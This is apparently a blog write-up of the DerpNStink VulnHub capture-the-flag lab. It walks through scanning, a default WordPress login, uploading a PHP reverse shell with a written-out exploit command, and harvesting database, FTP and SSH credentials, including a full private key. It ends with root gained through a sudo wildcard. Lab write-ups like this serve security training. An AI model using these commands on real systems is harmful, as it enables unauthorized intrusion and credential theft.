---
layout: post
title: "Derpnstink"
date: 2019-05-19 20:36:18 +0300
comments: true
categories: [penetration testing, writeups]
keywords: derpnstink, pentest lab, vulnhub, ctf, boot2root
description: Derpnstink writeup
---

Today's VM is inspired from the OSCP labs and it has 4 flags to collect.

> Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live...

<!-- more -->

```
ORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/php/ /temporary/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: DeRPnStiNK
```

Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:

{% img center /images/pentest/derpnstink/derpnstink.png 'derpnstink' 'derpnstink' %}

Let's check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a */weblog* folder:

```
/weblog (Status: 301)
```

When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:

{% img center /images/pentest/derpnstink/weblog.png 'weblog' 'weblog' %}

This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:

```
[!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9222
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/

 [!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
  |     Fixed in: 1.4.7
  |     References:
  |      - https://wpvulndb.com/vulnerabilities/7532
  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
  |      - https://www.exploit-db.com/exploits/34681/
  |      - https://www.exploit-db.com/exploits/34514/
  |      - http://seclists.org/bugtraq/2014/Sep/1
  |      - http://packetstormsecurity.com/files/131526/
  |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
```

It seems not much can be done without authentication, so I went to wp-admin and enumerated the username *admin* as a valid user...and in the process also discovered that the password is *admin*..derp! Now I could use an [exploit for the authenticated arbitrary file upload](https://www.exploit-db.com/exploits/34681) with <code>python gallery.py -t http://derpnstink.local/weblog/ -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php

From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:

```
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'mysql');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Inside <code>/var/www/html/php/info.php</code> there is a line stating that there's a PHPMyAdmin interface:

```
/* management interface can be found at /phpmyadmin
```

I went to http://derpnstink.local/php/phpmyadmin/ and used the credentials to get in the wordpress database and get 2 users and hashes:

{% img center /images/pentest/derpnstink/users.png 'users' 'users' %}

We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password *wedgie57* for user *unclestinky*. My first move was to try SSH'ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials *stinky*:*wedgie57* (there was no unclestinky user configured on the system)

On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r ftp://derpnstink.local/files --ftp-user=stinky --ftp-password=wedgie57</code>

```
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
226 Directory send OK.
ftp> ls files
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp
```

Inside network-logs there's a file that hints at some PCAP analysis:

```
cat derpissues.txt
12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
12:07 stinky: yeah. did you need a password reset?
12:07 mrderp: I think i accidently deleted my account
12:07 mrderp: i just need to logon once to make a change
12:07 stinky: im gonna packet capture so we can figure out whats going on
12:07 mrderp: that seems a bit overkill, but wtv
12:08 stinky: commence the sniffer!!!!
12:08 mrderp: -_-
12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
12:11 mrderp: awesome it works!
12:12 stinky: we really are the best sysadmins #team
12:13 mrderp: i guess we are...
12:15 mrderp: alright I made the changes, feel free to decomission my account
12:20 stinky: done! yay
```

Inside */files/ssh/ssh/ssh/ssh/ssh/ssh/ssh* there's a private key:

```
cat key.txt
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
-----END RSA PRIVATE KEY-----
```

Now we can SSH on the box:

```
ssh -i stinky_key stinky@derpnstink.local
Ubuntu 14.04.5 LTS


                       ,~~~~~~~~~~~~~..
                       '  Derrrrrp  N  `
        ,~~~~~~,       |    Stink      |
       / ,      \      ',  ________ _,"
      /,~|_______\.      \/
     /~ (__________)
    (*)  ; (^)(^)':
        =;  ____  ;
          ; """"  ;=
   {"}_   ' '""' ' _{"}
   \__/     >  <   \__/
      \    ,"   ",  /
       \  "       /"
          "      "=
           >     <
          ="     "-
          -`.   ,'
                -
            `--'

Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

331 packages can be updated.
231 updates are security updates.

Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
stinky@DeRPnStiNK:~$
```

Inside Documents there's the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:

```
user_login=mrderp
pass1=derpderpderpderpderpderpderp
```

In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:

```
mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
From: Help Desk <helpdesk@derpnstink.local>
Date: Thu, Aug 23, 2017 at 1:29 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.

Help Desk Ticket Notification
Thank you for contacting the Help Desk. Your ticket information is below. If you have any
additional information to add to this ticket, please reply to this notification.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us. Note that the Help Desk's busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).

Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: Sudoers File issues
Ticket Number: 242
Status: Break/fix
Date Created: 08/23/2017
Latest Update Date: 08/23/2017
Contact Name: Mr Derp
CC’s: Uncle Stinky
Full description and latest notes on your Ticket: Sudoers File issues
Notification


Regards,
Service Desk


Listen with focus, answer with accuracy, assist with compassion.

From: Help Desk
Date: Mon, Sep 10, 2017 at 2:53 PM
Subject: sudoers ISSUE=242 PROJ=26
To: Derp, Mr (mrderp) [C]
When replying, type your text above this line.

Closed Ticket Notification

Thank you for contacting the Help Desk. Your ticket information and its resolution is
below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
assistance, please reply to this notification to provide additional information.
If you need immediate help (i.e. you are within two days of a deadline or in the event of a
security emergency), call us or visit our Self Help Web page at https://pastebin.com/RzK9WfGw
Note that the Help Desk's busiest hours are between 10 a.m. (ET)
and 3 p.m. (ET).
Toll-free: 1-866-504-9552
Phone: 301-402-7469
TTY: 301-451-5939
Ticket Title: sudoers issues
Ticket Number: 242
Status: Closed
Date Created: 09/10/2017
Latest Update Date: 09/10/2017
CC’s:
Resolution: Closing ticket. ticket notification.

Regards,
eRA Service Desk
Listen with focus, answer with accuracy, assist with compassion.
For more information, dont forget to visit the Self Help Web page!!!
```

On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:

```
mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt
*******************************************************************
On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.

However i dont want to specify each command to allow

How can I exclude these commands from password protection to sudo?

********************************************************************



********************************************************************
Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.

Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.

Thank you for using our product.

********************************************************************
```

Running a **sudo -l** gives us the sudo commands that mrderp can run:

```
User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:

```
mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
[sudo] password for mrderp:
root@DeRPnStiNK:~/binaries#
```

Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:

```
root@DeRPnStiNK:/root# cat Desktop/flag.txt
flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)

Congrats on rooting my first VulnOS!

Hit me up on twitter and let me know your thoughts!

@securekomodo
```

```
______________________________________
/ You need more time; and you probably \
\ always will.                         /
--------------------------------------
       \   ^__^
        \  (oo)\_______
           (__)\       )\/\
               ||----w |
               ||     ||
```

